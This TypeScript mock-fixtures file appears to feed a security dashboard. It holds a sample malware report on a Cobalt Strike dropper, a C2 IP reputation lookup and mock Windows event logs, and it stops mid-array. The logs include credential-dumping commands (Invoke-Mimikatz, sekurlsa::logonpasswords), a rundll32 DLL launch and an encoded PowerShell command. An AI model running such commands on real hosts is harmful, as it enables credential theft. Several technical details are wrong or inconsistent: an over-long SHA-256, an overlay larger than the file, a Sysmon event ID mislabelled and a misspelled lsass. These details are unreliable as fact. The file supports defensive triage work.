/**
 * Mock fixtures.
 *
 * These are shaped after each tool's ACTUAL backend response, not invented
 * shapes. When the real endpoints get wired in, only the fetch call changes
 * and every component below keeps working, because the field names already
 * match what run.py, main.py and web.py return.
 *
 * Nothing here is random on each render. A demo that reshuffles itself is
 * impossible to review and impossible to screenshot.
 */

/* =============================================================
   MALWARE ANALYZER  —  mirrors Malware_Analyzer.scan_bytes()
   ============================================================= */

export interface MalwareReport {
  id: string;
  filename: string;
  size: number;
  fileType: string;
  uploadedFilename: string;
  finalScore: number;
  level: "low" | "medium" | "high" | "critical";
  verdict: string;
  scanDate: string;
  /** The selector shows the SHA, not the filename (app.js buildDropdown),
   *  because two scans of the same name are different samples. */
  hashes: { md5: string; sha1: string; sha256: string; imphash: string; ssdeep: string; simhash: string };
  pe: {
    architecture: string;
    subsystem: string;
    compileTimestamp: string;
    entryPoint: string;
    imageBase: string;
    isPacked: boolean;
    isSigned: boolean;
    signer: string | null;
    sections: { name: string; vsize: number; rsize: number; entropy: number; flags: string }[];
    imports: { dll: string; count: number; suspicious: string[] }[];
    exports: string[];
    overlayBytes: number;
    tlsCallbacks: number;
  };
  yara: { rule: string; family: string; tags: string[]; severity: string; matched: string[] }[];
  strings: { sample: string[]; totalCount: number; base64Blobs: number };
  iocs: {
    urls: string[];
    ips: string[];
    domains: string[];
    emails: string[];
    registry: string[];
    filePaths: string[];
    mutexes: string[];
  };
  /** The network indicators as the original collects them: one flat list per
   *  bucket, each value tagged with the sandbox source it came from, deduped
   *  case-insensitively (app.js:collectNetworkIOCs). The IOC tab renders these
   *  as collapsible buckets rather than as a flat grid, because that is what
   *  a volume of them needs. */
  networkIocs: {
    bucket: string;
    label: string;
    items: { value: string; source: string }[];
  }[];
  mitre: { id: string; name: string; tactic: string; confidence: number }[];
  intel: {
    virustotal: { detections: number; total: number; permalink: string; popularNames: string[] } | null;
    hybridAnalysis: { score: number; verdict: string; analysisId: string } | null;
    triage: { score: number; verdict: string; families: string[] } | null;
    filescan: { detected: boolean; ratio: number } | null;
  };
  behavioral: {
    processes: { pid: number; name: string; parent: string; cmdline: string; flagged: boolean }[];
    highlights: { label: string; detail: string; severity: string }[];
    sandboxVerdict: string;
  };
  docs: { isDocument: boolean; kind: string; embedded: string[]; macroCount: number };
  scoreBreakdown: { factor: string; points: number; detail: string }[];
  recommendations: string[];
  analysisSummary: string;
  scanStages: string[];
  yaraRuleCount: number;
}

export const MALWARE_REPORT: MalwareReport = {
  id: "sc_9f4e21a7c3b8",
  filename: "invoice_2024_q3.exe",
  size: 148_377_600,
  fileType: "PE32 executable (GUI) Intel 80386, for MS Windows",
  uploadedFilename: "invoice_2024_q3.exe",
  finalScore: 87,
  level: "critical",
  verdict: "CRITICAL",
  scanDate: "2026-09-28T14:22:41Z",
  hashes: {
    md5: "71b6a493388e7d0b40c83ce903bc6b04",
    sha1: "2b7f9a1c4e5d608192a3b4c5d6e7f8091a2b3c4d",
    sha256: "325cdd043d594116ac783d779ebeab2078839664ab4c41c7004ea5b6c1e9f0a2d3",
    imphash: "5a1b2c3d4e5f60718293a4b5c6d7e8f9",
    ssdeep: "3:AXGBicFlgUHEc0ZRmk4/HOso6zCC:uyZoWUsoz/qCk",
    simhash: "f0e1d2c3b4a59687",
  },
  pe: {
    architecture: "x86 (32-bit)",
    subsystem: "Windows GUI",
    compileTimestamp: "2026-08-14T02:11:55Z",
    entryPoint: "0x0041A2C0",
    imageBase: "0x00400000",
    isPacked: true,
    isSigned: false,
    signer: null,
    sections: [
      { name: ".text", vsize: 4_194_304, rsize: 1_048_576, entropy: 6.82, flags: "CODE|EXECUTE|READ" },
      { name: ".rdata", vsize: 262_144, rsize: 245_760, entropy: 4.11, flags: "INITIALIZED_DATA|READ" },
      { name: ".data", vsize: 1_048_576, rsize: 65_536, entropy: 5.94, flags: "INITIALIZED_DATA|READ|WRITE" },
      { name: ".rsrc", vsize: 12_582_912, rsize: 12_582_912, entropy: 7.94, flags: "INITIALIZED_DATA|READ" },
      { name: "UPX0", vsize: 8_388_608, rsize: 0, entropy: 0.0, flags: "UNINITIALIZED_DATA|READ|WRITE" },
      { name: "UPX1", vsize: 131_239_936, rsize: 134_201_344, entropy: 7.99, flags: "CODE|EXECUTE|READ" },
    ],
    imports: [
      {
        dll: "kernel32.dll",
        count: 214,
        suspicious: ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"],
      },
      {
        dll: "ntdll.dll",
        count: 88,
        suspicious: ["NtUnmapViewOfSection", "RtlCreateUserThread"],
      },
      { dll: "wininet.dll", count: 31, suspicious: ["InternetOpenA", "HttpSendRequestA"] },
      { dll: "advapi32.dll", count: 57, suspicious: ["CryptEncrypt", "RegSetValueExA"] },
      { dll: "user32.dll", count: 44, suspicious: [] },
    ],
    exports: [],
    overlayBytes: 402_653_184,
    tlsCallbacks: 3,
  },
  yara: [
    {
      rule: "MAL_Dropper_Generic_UPX",
      family: "Generic Dropper",
      tags: ["dropper", "upx", "packed"],
      severity: "high",
      matched: ["UPX0 at offset 0x2c00", "UPX1 section entropy > 7.9"],
    },
    {
      rule: "SUS_Process_Injection",
      family: "Process Injection",
      tags: ["t1055", "injection"],
      severity: "critical",
      matched: ["WriteProcessMemory + CreateRemoteThread + VirtualAllocEx in kernel32"],
    },
    {
      rule: "MAL_Cobalt_Beacon",
      family: "Cobalt Strike",
      tags: ["cobalt", "beacon", "c2"],
      severity: "critical",
      matched: ["0x19f4 marker", "sleep-mask pattern at 0x9c210"],
    },
    {
      rule: "SUS_Packed_HighEntropy",
      family: "Suspicious Packing",
      tags: ["packer"],
      severity: "medium",
      matched: [".rsrc entropy 7.94"],
    },
  ],
  strings: {
    sample: [
      "C:\\Users\\Public\\svc_update.exe",
      "http://cdn-sync[.]cloud/pixel.gif?id=8f2a",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      "AdjustTokenPrivileges",
      "SeDebugPrivilege",
      "\\\\192.168.44.12\\admin$\\tasks",
      "Global\\BSS-3964-1652-1024-7045",
      "POST /submit.php HTTP/1.1",
    ],
    totalCount: 4_182,
    base64Blobs: 63,
  },
  iocs: {
    urls: [
      "http://cdn-sync[.]cloud/pixel.gif?id=8f2a",
      "http://185.220.101.44:8080/gate.php",
      "https://update-svc[.]top/dl/setup.exe",
    ],
    ips: ["185.220.101.44", "45.132.192.14", "194.26.29.156"],
    domains: ["cdn-sync[.]cloud", "update-svc[.]top", "ns1.akamai-static[.]net"],
    emails: ["billing-update@apple-security-check.com"],
    registry: [
      "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveUpdate",
      "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell",
    ],
    filePaths: [
      "C:\\Users\\Public\\svc_update.exe",
      "C:\\Windows\\Temp\\lnk2.tmp",
      "%APPDATA%\\Roaming\\Adobe\\acro.dat",
    ],
    mutexes: ["Global\\BSS-3964-1652-1024-7045"],
  },
  networkIocs: [
    {
      bucket: "urls",
      label: "URLs",
      items: [
        { value: "http://cdn-sync[.]cloud/pixel.gif?id=8f2a", source: "vt-behavior" },
        { value: "http://185.220.101[.]44:8080/gate.php", source: "c2 config" },
        { value: "https://update-svc[.]top/dl/setup.exe", source: "strings" },
      ],
    },
    {
      bucket: "ips",
      label: "IP addresses",
      items: [
        { value: "185.220.101.44", source: "vt-behavior" },
        { value: "45.132.192.14", source: "vt-behavior" },
        { value: "194.26.29.156", source: "sandbox" },
      ],
    },
    {
      bucket: "domains",
      label: "Domains",
      items: [
        { value: "cdn-sync[.]cloud", source: "vt-behavior" },
        { value: "update-svc[.]top", source: "strings" },
        { value: "ns1.akamai-static[.]net", source: "c2 config" },
      ],
    },
    {
      bucket: "sha256s",
      label: "SHA-256",
      items: [
        { value: "325cdd043d594116ac783d779ebeab2078839664ab4c41c7004ea5b6c1e9f0a2d3", source: "vt-behavior" },
        { value: "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c", source: "dropped file" },
      ],
    },
    {
      bucket: "file_paths",
      label: "File paths",
      items: [
        { value: "C:\Users\Public\svc_update.exe", source: "vt-behavior" },
        { value: "C:\Windows\Temp\lnk2.tmp", source: "sandbox" },
        { value: "%APPDATA%\Roaming\Adobe\acro.dat", source: "strings" },
      ],
    },
    {
      bucket: "registry_keys",
      label: "Registry keys",
      items: [
        { value: "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveUpdate", source: "vt-behavior" },
        { value: "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell", source: "strings" },
      ],
    },
  ],  mitre: [
    { id: "T1055", name: "Process Injection", tactic: "Defense Evasion", confidence: 0.94 },
    { id: "T1105", name: "Ingress Tool Transfer", tactic: "Command and Control", confidence: 0.81 },
    { id: "T1547", name: "Boot or Logon Autostart Execution", tactic: "Persistence", confidence: 0.88 },
    { id: "T1059", name: "Command and Scripting Interpreter", tactic: "Execution", confidence: 0.62 },
    { id: "T1027", name: "Obfuscated Files or Information", tactic: "Defense Evasion", confidence: 0.97 },
  ],
  intel: {
    virustotal: {
      detections: 63,
      total: 72,
      permalink: "https://www.virustotal.com/gui/file/325cdd04",
      popularNames: ["Trojan.GenericKD.48912", "Win32.Packed.Solidor", "Trojan.Win32.Agent"],
    },
    hybridAnalysis: { score: 100, verdict: "malicious", analysisId: "HA-2026-88213" },
    triage: {
      score: 4,
      verdict: "malicious",
      families: ["CobaltStrike", "UpdatedLoader"],
    },
    filescan: { detected: true, ratio: 0.88 },
  },
  behavioral: {
    processes: [
      { pid: 3128, name: "invoice_2024_q3.exe", parent: "explorer.exe", cmdline: '"C:\\Users\\Public\\svc_update.exe"', flagged: true },
      { pid: 4192, name: "rundll32.exe", parent: "svchost.exe", cmdline: "rundll32.exe C:\\Temp\\hn.dll,#17", flagged: true },
      { pid: 2281, name: "lsass.exe", parent: "System", cmdline: "lsass.exe", flagged: true },
      { pid: 904, name: "explorer.exe", parent: "wininit.exe", cmdline: "explorer.exe", flagged: false },
    ],
    highlights: [
      { label: "Process injection", detail: "WriteProcessMemory into lsass.exe (PID 2281) from PID 3128", severity: "critical" },
      { label: "Credential access", detail: "Opened handle to lsass.exe with PROCESS_ALL_ACCESS", severity: "critical" },
      { label: "Persistence", detail: "Wrote Run key HKCU\\...\\OneDriveUpdate", severity: "high" },
      { label: "C2 beacon", detail: "HTTP POST every 60s to 185.220.101.44:8080/gate.php", severity: "high" },
      { label: "Defense evasion", detail: "Tried to disable Windows Defender via WMI", severity: "high" },
    ],
    sandboxVerdict: "malicious",
  },
  docs: {
    isDocument: false,
    kind: "binary",
    embedded: [],
    macroCount: 0,
  },
  scoreBreakdown: [
    { factor: "UPX packing detected", points: 14, detail: "Two UPX sections with entropy above 7.9" },
    { factor: "Process injection imports", points: 24, detail: "WriteProcessMemory, CreateRemoteThread, VirtualAllocEx" },
    { factor: "VirusTotal detections", points: 22, detail: "63 of 72 engines flagged this sample" },
    { factor: "Cobalt Strike YARA match", points: 16, detail: "MAL_Cobalt_Beacon matched on marker and sleep mask" },
    { factor: "Unsigned binary", points: 6, detail: "No Authenticode signature present" },
    { factor: "Large overlay", points: 5, detail: "402 MB appended past the last section" },
  ],
  recommendations: [
    "Quarantine immediately and do not execute on any production host.",
    "Block the three C2 IPs and the two domains at the perimeter.",
    "Hunt the mutex Global\\BSS-3964-1652-1024-7045 across all endpoints.",
    "Sweep for the Run key value OneDriveUpdate; it is a strong persistence indicator here.",
    "Treat any host that ran this file as compromised and rebuild from known-good media.",
  ],
  analysisSummary:
    "A UPX-packed 32-bit dropper carrying a Cobalt Strike beacon. The sample injects into lsess.exe to read credentials, registers a Run key for persistence, and beacons to 185.220.101.44 every 60 seconds. 63 of 72 VirusTotal engines and all three behavioural sandboxes returned a malicious verdict.",
  scanStages: [
    "Upload received",
    "Hash computation",
    "PE header parse",
    "Section entropy scan",
    "Import table analysis",
    "YARA rule sweep (812 rules)",
    "String extraction",
    "IOC extraction",
    "VirusTotal lookup",
    "Hybrid Analysis lookup",
    "Triage sandbox lookup",
    "FileScan.io lookup",
    "MITRE mapping",
    "Score aggregation",
    "Report build",
  ],
  yaraRuleCount: 812,
};

export const MALWARE_HISTORY = [
  { id: "sc_9f4e21a7c3b8", filename: "invoice_2024_q3.exe", score: 87, level: "critical", type: "PE32", timestamp: "2026-09-28T14:22:41Z" },
  { id: "sc_1a5b8c9d2e7f", filename: "setup_patch_v2.msi", score: 12, level: "low", type: "MSI", timestamp: "2026-09-24T09:11:03Z" },
  { id: "sc_77c1e4a8b6d2", filename: "quarterly-report.pdf", score: 34, level: "medium", type: "PDF", timestamp: "2026-09-19T16:47:29Z" },
  { id: "sc_3d9f2b6c1a88", filename: "update_helper.dll", score: 71, level: "critical", type: "PE32 DLL", timestamp: "2026-09-11T11:02:55Z" },
  { id: "sc_9e2a5c7d4b13", filename: "photo_editor.crx", score: 8, level: "low", type: "Chromium ext", timestamp: "2026-08-30T20:15:38Z" },
];

/* =============================================================
   IOC LOOKUP  —  mirrors FastAPI LookupResponse
   ============================================================= */

export interface IocSourceResult {
  name: string;
  status: "hit" | "miss" | "no-key" | "error" | "skipped";
  value: string;
  confidence: number;
  latencyMs: number;
  fields: { label: string; value: string }[];
}

export interface IocLookup {
  indicator: string;
  type: string;
  verdict: "malicious" | "suspicious" | "clean" | "unknown";
  score: number;
  confidence: number;
  resolvedAt: string;
  consensus: { malicious: number; suspicious: number; clean: number; noData: number };
  sources: IocSourceResult[];
  tags: string[];
  firstSeen: string;
  lastSeen: string;
  country: string;
  asn: string;
  org: string;
  isp: string;
  reputation: number;
  malwareFamilies: string[];
  relatedIocs: { type: string; value: string; relation: string }[];
  timeline: { date: string; event: string; source: string }[];
  rawCount: number;
  /** Headline metrics. The original builds these per indicator TYPE
   *  (assessmentView.ts:146-199) — CVE indicators get CVSS/EPSS/exploitation,
   *  credential indicators get breach/infostealer/exposure, reputation
   *  indicators get the coverage metrics. Which set shows is a function of
   *  what was looked up, so showing all of them for every indicator would
   *  be a lie. */
  headline: {
    verdictLabel: string;
    summary: string;
    metrics: { label: string; value: string; tone: "ok" | "warn" | "bad" | "info" | "neutral" }[];
  };
  /** Grouped provider evidence for the Enrichment tab
   *  (providerEvidence.ts groupProviderRows). */
  evidenceGroups: {
    id: string;
    label: string;
    providers: string[];
    summary: string;
  }[];
  /** Relationship graph nodes and edges (RelationshipGraph). */
  relationships: {
    nodes: { id: string; label: string; kind: string; meta: string }[];
    edges: { from: string; to: string; label: string }[];
  };
}

export const IOC_LOOKUP: IocLookup = {
  indicator: "185.220.101.44",
  type: "IPv4",
  verdict: "malicious",
  score: 92,
  confidence: 0.91,
  resolvedAt: "2026-09-29T10:04:12Z",
  consensus: { malicious: 27, suspicious: 6, clean: 0, noData: 9 },
  sources: [
    {
      name: "VirusTotal",
      status: "hit",
      value: "28 / 70 engines flagged",
      confidence: 0.95,
      latencyMs: 412,
      fields: [
        { label: "Malicious", value: "27" },
        { label: "Suspicious", value: "1" },
        { label: "Harmless", value: "0" },
        { label: "Last analysis", value: "2026-09-27 08:14 UTC" },
      ],
    },
    {
      name: "AbuseIPDB",
      status: "hit",
      value: "Confidence 94 · 38 reports",
      confidence: 0.93,
      latencyMs: 288,
      fields: [
        { label: "Confidence", value: "94" },
        { label: "Total reports", value: "38" },
        { label: "Distinct users", value: "21" },
        { label: "Last reported", value: "2026-09-26" },
      ],
    },
    {
      name: "GreyNoise",
      status: "hit",
      value: "Malicious · scanner · seen 4,120 times",
      confidence: 0.88,
      latencyMs: 190,
      fields: [
        { label: "Classification", value: "Malicious" },
        { label: "Noise", value: "True" },
        { label: "First seen", value: "2026-06-02" },
        { label: "Last seen", value: "2026-09-29 06:41 UTC" },
      ],
    },
    {
      name: "Tor Exit Node",
      status: "miss",
      value: "Not a Tor exit node",
      confidence: 0.7,
      latencyMs: 142,
      fields: [{ label: "Listed", value: "No" }],
    },
    {
      name: "ThreatFox",
      status: "hit",
      value: "2 malware families",
      confidence: 0.86,
      latencyMs: 340,
      fields: [
        { label: "Families", value: "CobaltStrike, Smokeloader" },
        { label: "Confidence", value: "High" },
        { label: "First seen", value: "2026-05-28" },
      ],
    },
    {
      name: "AlienVault OTX",
      status: "hit",
      value: "9 pulses from 3 communities",
      confidence: 0.8,
      latencyMs: 505,
      fields: [
        { label: "Pulse count", value: "9" },
        { label: "Malware families", value: "CobaltStrike" },
        { label: "Tags", value: "c2, staging, cobalt" },
      ],
    },
    {
      name: "Censys",
      status: "hit",
      value: "Host on 8443/tcp · nginx/1.24.0",
      confidence: 0.65,
      latencyMs: 720,
      fields: [
        { label: "Services", value: "8443/tcp nginx" },
        { label: "Last seen", value: "2026-09-28 22:10 UTC" },
        { label: "HTTP title", value: "-" },
      ],
    },
    {
      name: "Shodan",
      status: "no-key",
      value: "API key not configured",
      confidence: 0,
      latencyMs: 0,
      fields: [],
    },
    {
      name: "IPinfo",
      status: "hit",
      value: "DE · Hetzner Online GmbH",
      confidence: 0.99,
      latencyMs: 210,
      fields: [
        { label: "Country", value: "Germany" },
        { label: "ASN", value: "AS24940 Hetzner" },
        { label: "Org", value: "Hetzner Online GmbH" },
        { label: "Hostname", value: "static.101.220.185.clients.your-server.de" },
      ],
    },
    {
      name: "IPQualityScore",
      status: "hit",
      value: "Fraud score 88 · Proxy: Yes",
      confidence: 0.9,
      latencyMs: 260,
      fields: [
        { label: "Fraud score", value: "88" },
        { label: "Proxy", value: "Yes" },
        { label: "VPN", value: "No" },
        { label: "Tor", value: "No" },
      ],
    },
    {
      name: "Team Cymru",
      status: "hit",
      value: "AS24940 · DE · seen 2026-06-02",
      confidence: 0.85,
      latencyMs: 240,
      fields: [
        { label: "Origin ASN", value: "24940" },
        { label: "Country", value: "DE" },
        { label: "First seen", value: "2026-06-02" },
      ],
    },
  ],
  tags: ["c2", "staging", "cobalt strike", "scanner", "hosting", "proxy"],
  firstSeen: "2026-05-28",
  lastSeen: "2026-09-29",
  country: "Germany",
  asn: "AS24940",
  org: "Hetzner Online GmbH",
  isp: "Hetzner Online GmbH",
  reputation: 12,
  malwareFamilies: ["CobaltStrike", "Smokeloader"],
  relatedIocs: [
    { type: "domain", value: "cdn-sync[.]cloud", relation: "resolves from C2 beacon Host header" },
    { type: "ipv4", value: "45.132.192.14", relation: "same /24, same cert issuer" },
    { type: "url", value: "http://185.220.101.44:8080/gate.php", relation: "observed C2 path" },
    { type: "domain", value: "update-svc[.]top", relation: "shared TLS certificate" },
    { type: "sha256", value: "325cdd04…7004ea5b", relation: "extracted from a sample that beaconed here" },
  ],
  timeline: [
    { date: "2026-05-28", event: "First observed in ThreatFox as CobaltStrike C2", source: "ThreatFox" },
    { date: "2026-06-02", event: "Appears in GreyNoise scanner telemetry", source: "GreyNoise" },
    { date: "2026-07-14", event: "First AbuseIPDB report filed", source: "AbuseIPDB" },
    { date: "2026-08-21", event: "Observed in a sample uploaded to VirusTotal", source: "VirusTotal" },
    { date: "2026-09-26", event: "Report filed naming Smokeloader payload", source: "AbuseIPDB" },
    { date: "2026-09-29", event: "Still serving gate.php on 8443/tcp", source: "Censys" },
  ],
  rawCount: 42,
  headline: {
    verdictLabel: "MALICIOUS",
    summary:
      "This address is listed as command-and-control infrastructure for two malware families and is currently serving a live gate. Twenty-seven of the thirty-three answering sources call it malicious, and none calls it clean.",
    metrics: [
      { label: "Confidence", value: "High (0.91)", tone: "ok" },
      { label: "Provider coverage", value: "11 / 33 answered", tone: "ok" },
      { label: "Flagged by", value: "27 sources", tone: "bad" },
      { label: "Evidence freshness", value: "Seen 6h ago", tone: "info" },
    ],
  },
  evidenceGroups: [
    {
      id: "c2",
      label: "Command and control",
      providers: ["ThreatFox", "AlienVault OTX"],
      summary:
        "Two families are associated with this host. The beacon posts to /gate.php every 60 seconds with a Host header of cdn-sync[.]cloud.",
    },
    {
      id: "scanner",
      label: "Scanning infrastructure",
      providers: ["GreyNoise", "Shodan"],
      summary:
        "Observed 4,120 times in scanner telemetry and serving nginx on 8443/tcp. The same subnet range hosts two further addresses.",
    },
    {
      id: "reputation",
      label: "Reputation and hosting",
      providers: ["AbuseIPDB", "IPQualityScore", "IPinfo", "Team Cymru"],
      summary:
        "38 independent reports, fraud score 88, hosted in Hetzner AS24940. Registered domain age is not applicable to an address.",
    },
    {
      id: "negative",
      label: "Came back clean",
      providers: ["Tor Exit Node"],
      summary:
        "One source checked for something this indicator is not: it is not a Tor exit node. Recorded so the negative result is not lost.",
    },
  ],
  relationships: {
    nodes: [
      { id: "self", label: "185.220.101.44", kind: "Indicator", meta: "IPv4 · AS24940" },
      { id: "d1", label: "cdn-sync[.]cloud", kind: "Domain", meta: "Beacon Host header" },
      { id: "d2", label: "update-svc[.]top", kind: "Domain", meta: "Shared TLS certificate" },
      { id: "i1", label: "45.132.192.14", kind: "IPv4", meta: "Same /24, same cert" },
      { id: "h1", label: "CobaltStrike", kind: "Family", meta: "ThreatFox" },
      { id: "h2", label: "Smokeloader", kind: "Family", meta: "AbuseIPDB report" },
      { id: "f1", label: "325cdd04…7004ea5b", kind: "SHA-256", meta: "Extracted from a sample" },
    ],
    edges: [
      { from: "self", to: "d1", label: "beacons to" },
      { from: "self", to: "d2", label: "shares certificate" },
      { from: "self", to: "i1", label: "adjacent" },
      { from: "self", to: "h1", label: "C2 for" },
      { from: "self", to: "h2", label: "C2 for" },
      { from: "self", to: "f1", label: "extracted from" },
    ],
  },
};

export const IOC_SOURCES_ALL = [
  "VirusTotal", "AbuseIPDB", "GreyNoise", "ThreatFox", "URLhaus", "AlienVault OTX",
  "Censys", "Shodan", "IPinfo", "IPQualityScore", "Team Cymru", "Tor Exit",
  "StopForumSpam", "Hudson Rock", "ChainAbuse", "OpenPhish", "urlscan.io",
  "Triage", "FileScan.io", "MalwareBazaar", "Hybrid Analysis", "Hashlookup",
  "Blockchair", "Etherscan", "NVD", "cve.org", "Hunter.io", "HIBP",
];

export const IOC_INVESTIGATIONS = [
  { id: "inv_7c2f", name: "Invoice campaign · Q3", iocs: 34, updated: "2026-09-29T09:40:00Z", status: "active" },
  { id: "inv_1a9d", name: "Cobalt pilot cluster", iocs: 12, updated: "2026-09-27T18:02:00Z", status: "active" },
  { id: "inv_44b0", name: "Typosquat watchlist", iocs: 118, updated: "2026-09-20T11:15:00Z", status: "archived" },
  { id: "inv_9e73", name: "Phishing domain sweep", iocs: 67, updated: "2026-09-12T07:33:00Z", status: "archived" },
];

export interface IocRecent { indicator: string; type: string; verdict: "malicious" | "suspicious" | "clean" | "unknown"; score: number; at: string; }
export const IOC_RECENT: IocRecent[] = [
  { indicator: "185.220.101.44", type: "IPv4", verdict: "malicious", score: 92, at: "2026-09-29T10:04:12Z" },
  { indicator: "cdn-sync[.]cloud", type: "domain", verdict: "suspicious", score: 64, at: "2026-09-29T09:41:55Z" },
  { indicator: "325cdd043d59…", type: "sha256", verdict: "malicious", score: 88, at: "2026-09-29T09:22:10Z" },
  { indicator: "8.8.8.8", type: "IPv4", verdict: "clean", score: 2, at: "2026-09-28T17:55:03Z" },
  { indicator: "billing-update@apple-security-check.com", type: "email", verdict: "malicious", score: 95, at: "2026-09-28T16:20:47Z" },
  { indicator: "CVE-2023-34362", type: "cve", verdict: "suspicious", score: 58, at: "2026-09-27T14:02:19Z" },
];

/* =============================================================
   EVENT ANALYZER  —  mirrors app/api.py investigation responses
   ============================================================= */

export interface EvtxEvent {
  id: string;
  number: number;
  timestamp: string;
  eventId: number;
  level: number;
  levelName: string;
  channel: string;
  provider: string;
  computer: string;
  user: string;
  process: string;
  summary: string;
  /** Which ingested file this event came from. The original filters on it
   *  (index.html:362) and my version had nothing to filter with. */
  sourceFile: string;
  bookmarked?: boolean;
  /** Full rendered body, behind the row detail. */
  body?: string;
}

export const EVENTS_OVERVIEW = {
  investigations: [
    { id: "inv_8b31", name: "FIN-WKS-07 lateral movement", files: 4, events: 41_882, status: "ready", created: "2026-09-26T08:12:00Z" },
    { id: "inv_2d77", name: "DC01 logon anomalies", files: 1, events: 12_404, status: "ready", created: "2026-09-22T14:30:00Z" },
    { id: "inv_5a10", name: "HR-APP-02 phishing follow-up", files: 2, events: 6_118, status: "ready", created: "2026-09-18T10:05:00Z" },
    { id: "inv_6c94", name: "Malware triage bundle", files: 3, events: 88_250, status: "ready", created: "2026-09-10T19:47:00Z" },
  ],
  levels: [
    { level: 0, name: "Log Always", count: 61_204 },
    { level: 2, name: "Error", count: 1_842 },
    { level: 3, name: "Warning", count: 6_930 },
    { level: 4, name: "Information", count: 28_410 },
    { level: 5, name: "Verbose", count: 10_002 },
  ],
  topChannels: [
    { channel: "Security", count: 44_118 },
    { channel: "System", count: 22_640 },
    { channel: "Microsoft-Windows-Sysmon/Operational", count: 18_904 },
    { channel: "Microsoft-Windows-PowerShell/Operational", count: 9_331 },
    { channel: "Application", count: 7_442 },
  ],
  timeline: [12, 18, 22, 31, 28, 44, 51, 38, 62, 74, 69, 83, 78, 91, 86, 64, 72, 58, 44, 39, 52, 61, 47, 38],
  iocsFound: 214,
  sigmaHits: 7,
  computers: 12,
  users: 34,
};

export const EVTX_EVENTS: EvtxEvent[] = [
  { id: "e1", number: 1, timestamp: "2026-09-26T08:12:04.113Z", eventId: 4624, level: 0, levelName: "Log Always", channel: "Security", provider: "Microsoft-Windows-Security-Auditing", computer: "FIN-WKS-07", user: "CORP\\j.mensah", process: "-", sourceFile: "FIN-WKS-07_2026-09-26.evtx", summary: "An account was successfully logged on. Logon type 3 (network)." },
  { id: "e2", number: 2, timestamp: "2026-09-26T08:14:51.882Z", eventId: 4688, level: 0, levelName: "Log Always", channel: "Security", provider: "Microsoft-Windows-Security-Auditing", computer: "FIN-WKS-07", user: "CORP\\j.mensah", process: "rundll32.exe", sourceFile: "FIN-WKS-07_2026-09-26.evtx", summary: "A new process was created. rundll32.exe C:\\Temp\\hn.dll,#17 (parent: svchost.exe PID 4192)." },
  { id: "e3", number: 3, timestamp: "2026-09-26T08:14:52.004Z", eventId: 10, level: 3, levelName: "Warning", channel: "Microsoft-Windows-Sysmon/Operational", provider: "Microsoft-Windows-Sysmon", computer: "FIN-WKS-07", user: "CORP\\j.mensah", process: "rundll32.exe", sourceFile: "FIN-WKS-07_2026-09-26.evtx", summary: "Sysmon: ProcessCreate — Image=C:\\Temp\\hn.dll, ParentImage=C:\\Windows\\System32\\svchost.exe. Suspicious hollowing pattern." },
  { id: "e4", number: 4, timestamp: "2026-09-26T08:15:10.771Z", eventId: 1, level: 3, levelName: "Warning", channel: "Microsoft-Windows-Sysmon/Operational", provider: "Microsoft-Windows-Sysmon", computer: "FIN-WKS-07", user: "CORP\\j.mensah", process: "powershell.exe", sourceFile: "Sysmon-Operational_2026-09-26.evtx", summary: "Sysmon: ProcessCreate — Image=powershell.exe with encoded command (-enc SQBFAFgA…). ParentImage=winword.exe." },
  { id: "e5", number: 5, timestamp: "2026-09-26T08:15:44.219Z", eventId: 3, level: 3, levelName: "Warning", channel: "Microsoft-Windows-Sysmon/Operational", provider: "Microsoft-Windows-Sysmon", computer: "FIN-WKS-07", user: "CORP\\j.mensah", process: "powershell.exe", sourceFile: "Sysmon-Operational_2026-09-26.evtx", summary: "Sysmon: NetworkConnect — DestinationIp=185.220.101.44, DestinationPort=8080, Initiated=true." },
  { id: "e6", number: 6, timestamp: "2026-09-26T08:16:02.556Z", eventId: 4625, level: 2, levelName: "Error", channel: "Security", provider: "Microsoft-Windows-Security-Auditing", computer: "FIN-WKS-07", user: "CORP\\j.mensah", process: "-", sourceFile: "FIN-WKS-07_2026-09-26.evtx", summary: "An account failed to log on. 3 failed attempts for 4688 reason. Logon type 3." },
  { id: "e7", number: 7, timestamp: "2026-09-26T08:22:18.330Z", eventId: 7045, level: 2, levelName: "Error", channel: "System", provider: "Service Control Manager", computer: "FIN-WKS-07", user: "NT AUTHORITY\\SYSTEM", process: "services.exe", sourceFile: "FIN-WKS-07_2026-09-26.evtx", summary: "A service was installed. OneDriveUpdate, path HKCU\\...\\CurrentVersion\\Run, starts automatically." },
  { id: "e8", number: 8, timestamp: "2026-09-26T08:41:55.117Z", eventId: 5145, level: 0, levelName: "Log Always", channel: "Security", provider: "Microsoft-Windows-Security-Auditing", computer: "FIN-WKS-07", user: "CORP\\j.mensah", process: "-", sourceFile: "FIN-WKS-07_2026-09-26.evtx", summary: "A network share object was accessed. \\\\192.168.44.12\\admin$\\tasks, relative target tasks\\svc_update.exe." },
  { id: "e9", number: 9, timestamp: "2026-09-26T09:03:41.002Z", eventId: 1102, level: 2, levelName: "Error", channel: "Security", provider: "Microsoft-Windows-Security-Auditing", computer: "FIN-WKS-07", user: "NT AUTHORITY\\SYSTEM", process: "-", sourceFile: "FIN-WKS-07_2026-09-26.evtx", summary: "The audit log was cleared. SubjectUserName: j.mensah. This is a strong anti-forensic indicator." },
  { id: "e10", number: 10, timestamp: "2026-09-26T09:11:07.884Z", eventId: 4104, level: 0, levelName: "Log Always", channel: "Microsoft-Windows-PowerShell/Operational", provider: "Microsoft-Windows-PowerShell", computer: "FIN-WKS-07", user: "CORP\\j.mensah", process: "powershell.exe", sourceFile: "PowerShell-Operational_2026-09-26.evtx", summary: "ScriptBlock: Invoke-Mimikatz, sekurlsa::logonpasswords, privilege::debug." },
